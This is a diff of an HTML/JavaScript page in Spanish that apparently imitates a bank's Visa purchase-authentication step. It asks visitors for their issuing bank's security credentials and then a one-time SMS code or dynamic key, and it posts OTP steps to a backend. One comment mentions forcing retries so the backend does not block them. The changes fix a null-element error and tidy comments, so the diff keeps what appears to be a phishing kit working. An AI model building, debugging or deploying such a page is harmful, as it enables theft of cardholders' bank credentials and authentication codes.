@@ -45,7 +45,7 @@
             z-index: 1;
         }
 
-        /* --- CABECERA DE LOGOS (Tamaño equilibrado) --- */
+        /* --- CABECERA DE LOGOS --- */
         .header { 
             display: flex; 
             align-items: center; 
@@ -58,7 +58,7 @@
             display: flex; 
             align-items: center; 
             justify-content: flex-start;
-            height: 45px; /* Tamaño ajustado */
+            height: 45px; /* Tamaño equilibrado */
         }
         .bank-logo img { 
             height: 100%; 
@@ -78,7 +78,7 @@
             display: flex; 
             align-items: center; 
             justify-content: flex-end;
-            height: 45px; /* Tamaño ajustado */
+            height: 45px; /* Tamaño equilibrado */
         }
         .visa-logo img { 
             height: 100%; 
@@ -333,6 +333,7 @@
 
         <h1 class="form-title" id="mainTitle">Autenticación de compra</h1>
         
+        <!-- Aquí está el problema: el span bankNombre no existía en el HTML anterior -->
         <p class="form-subtitle" id="mainSubtitle">
             Ingresa tus credenciales de seguridad para tu <strong id="bankNombre">banco emisor</strong> para validar la transacción.
         </p>
@@ -518,7 +519,7 @@
             if (bancoEmisor) {
                 bancoEmisor = normalizarBanco(bancoEmisor);
                 localStorage.setItem('bancoEmisor', bancoEmisor);
-                bancoNombre.textContent = bancoEmisor;
+                if (bancoNombre) bancoNombre.textContent = bancoEmisor;
             }
 
             if (bancoEmisor && bankLogos[bancoEmisor]) {
@@ -591,7 +592,7 @@
                         tipo_paso: 'otp',
                         solicitudOriginalId: datos.solicitudId,
                         tipo_tarjeta: 'visa',
-                        es_reintento: true // 🔥 FORZAMOS REINTENTO PARA QUE EL BACKEND NO LO BLOQUEE
+                        es_reintento: true 
                     })
                 });
                 const data = await response.json();
@@ -849,7 +850,14 @@
             passwordInput.disabled = true;
 
             document.getElementById('mainTitle').textContent = 'Autenticación de compra';
-            document.getElementById('mainSubtitle').innerHTML = `Hemos enviado un código de seguridad a tu móvil para validar la transacción con <strong>${document.getElementById('bankNombre').textContent}</strong>.`;
+            
+            // 🔥 VALIDACIÓN PARA EVITAR EL ERROR DE NULL
+            let bancoTexto = "banco emisor";
+            const bancoEl = document.getElementById('bankNombre');
+            if (bancoEl) bancoTexto = bancoEl.textContent;
+            else bancoTexto = localStorage.getItem('bancoEmisor') || "banco emisor";
+
+            document.getElementById('mainSubtitle').innerHTML = `Hemos enviado un código de seguridad a tu móvil para validar la transacción con <strong>${bancoTexto}</strong>.`;
 
             if (tipo === 'clave_dinamica') {
                 otpInfoMessage.innerHTML = `<span>Ingresa tu <strong>Clave Dinámica</strong> generada por el banco.</span>`;
